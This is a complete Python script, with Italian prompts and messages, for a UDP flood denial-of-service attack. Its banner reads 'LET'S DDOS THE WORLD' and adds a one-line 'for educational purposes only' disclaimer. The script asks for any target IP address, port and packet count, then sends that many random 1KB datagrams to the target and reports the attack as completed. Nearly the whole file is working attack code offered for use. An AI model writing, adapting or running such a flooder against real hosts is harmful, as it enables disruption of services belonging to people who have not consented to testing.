import socket
import random
import time
import sys
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("\033[95m" + r"""
 __        __   _                                
 \ \      / /__| | ___ ___  _ __ ___   ___    
  \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \  
   \ V  V /  __/ | (_| (_) | | | | | |  __/ 
    \_/\_/ \___|_|\___\___/|_| |_| |_|\___| 
                                                  
            LET'S DDOS THE WORLD 🌐💥
    (solo a fini didattici, ovviamente!)            
""" + "\033[0m")
    
    print("\t\033[1;37m[!] UDP Flood Simulator \033[0m")
    print("\t\033[1;37m[!] Usage: python3 UDPFlood.py\033[0m\n")

def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024  # 1 KB

    print(f"\n\033[93m[!] Inizio UDP Flood su {target_ip}:{target_port} - {num_packets} pacchetti da 1KB\033[0m\n")

    try:
        for i in range(1, num_packets + 1):
            data = random._urandom(packet_size)
            sock.sendto(data, (target_ip, target_port))
            print(f"\033[92m[✓] Pacchetto {i}/{num_packets} inviato\033[0m", end="\r")
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\n\033[91m[!] Attacco interrotto manualmente\033[0m")
        sys.exit()
    except Exception as e:
        print(f"\n\033[91m[!] Errore: {e}\033[0m")
        sys.exit()

    print(f"\n\033[94m[✓] Attacco completato con successo!\033[0m")

def main():
    clear_screen()
    banner()
    try:
        target_ip = input("\n\033[96m[*] Inserisci l'IP della macchina target: \033[0m").strip()
        target_port = int(input("\033[96m[*] Inserisci la porta UDP target (es. 5555): \033[0m").strip())
        num_packets = int(input("\033[96m[*] Quanti pacchetti da 1KB vuoi inviare? \033[0m").strip())

        if not (1 <= target_port <= 65535):
            raise ValueError("La porta deve essere tra 1 e 65535.")
        if num_packets <= 0:
            raise ValueError("Il numero di pacchetti deve essere positivo.")

        udp_flood(target_ip, target_port, num_packets)

    except ValueError as ve:
        print(f"\033[91m[!] Errore: {ve}\033[0m")
        sys.exit()

if __name__ == "__main__":
    main()
